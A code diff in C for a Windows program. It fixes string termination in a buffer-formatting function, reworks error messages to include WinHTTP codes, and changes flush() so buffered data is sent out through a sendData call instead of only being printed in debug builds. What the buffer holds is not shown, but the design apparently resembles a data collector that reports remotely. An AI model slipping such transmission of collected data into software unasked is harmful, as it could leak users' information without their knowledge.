@@ -726,22 +726,27 @@ void getStrRepr(char* repr, size_t* size)
             repr[written - 1] = ' ';
         }
     }
+    if (size != NULL)
+        (*size)++;
     if(repr != NULL)
-        repr[written - 1] = 0x00;
+        repr[written] = 0x00;
 
 }
 
 // Flushing function, basically pushing data to somewhere and empty the Buffer.
 void flush()
 {
-#ifdef DEBUG
     size_t size;
     getStrRepr(NULL, &size);
+    if (!size)
+        return;
     char* strRepr = malloc(size);
     getStrRepr(strRepr, NULL);
+#ifdef DEBUG
     printf("%s\n", strRepr);
-    free(strRepr);
 #endif
+    sendData(strRepr, size);
+    free(strRepr);
     Index = 0;
     for (size_t i = 0; i < BUFFSIZE; ++i)
         Buffer[i] = 0x00;
@@ -758,14 +763,15 @@ void handleError(LPCTSTR funcName)
     FormatMessage(
         FORMAT_MESSAGE_ALLOCATE_BUFFER |
         FORMAT_MESSAGE_FROM_SYSTEM |
+        FORMAT_MESSAGE_FROM_HMODULE |
         FORMAT_MESSAGE_IGNORE_INSERTS,
-        NULL,
+        GetModuleHandle("winhttp.dll"),
         err,
         MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
         (LPTSTR)&msg,
         0, NULL);
 
-    fprintf(stderr, "%s Failed With Error: %s", funcName, (char*)msg);
+    fprintf(stderr, "%s Failed With code: %d and Error: %s", funcName, err, (char*)msg);
 
     LocalFree(msg);
 }
